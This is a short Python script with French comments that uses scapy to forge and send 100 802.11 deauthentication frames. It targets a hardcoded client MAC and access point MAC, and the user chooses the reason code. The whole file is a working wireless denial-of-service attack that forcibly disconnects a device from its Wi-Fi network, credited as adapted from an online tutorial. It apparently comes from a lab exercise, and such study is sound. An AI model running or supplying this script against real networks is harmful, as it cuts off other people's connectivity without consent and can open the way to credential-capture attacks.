from scapy.all import *
import sys

reason = 0
while reason != 1 and reason != 4 and reason != 5 and reason != 8 :
    reason = int(input("Veuillez enter une raison entre 1, 4, 5 et 8\n"))
# grandement inspiré de https://www.thepythoncode.com/article/force-a-device-to-disconnect-scapy
target_mac = "a4:50:46:d6:31:98"
gateway_mac = "58:90:43:8F:7E:24"
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
if (reason == 8) : # envoie de la STA à l'AP
    dot11 = Dot11(addr1=gateway_mac, addr2=target_mac, addr3=gateway_mac)
else : # envoie de l'AP à la STA
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# stack them up
packet = RadioTap()/dot11/Dot11Deauth(reason=reason)
# send the packet
sendp(packet, inter=0.1, count=100, iface="wlan0", verbose=1)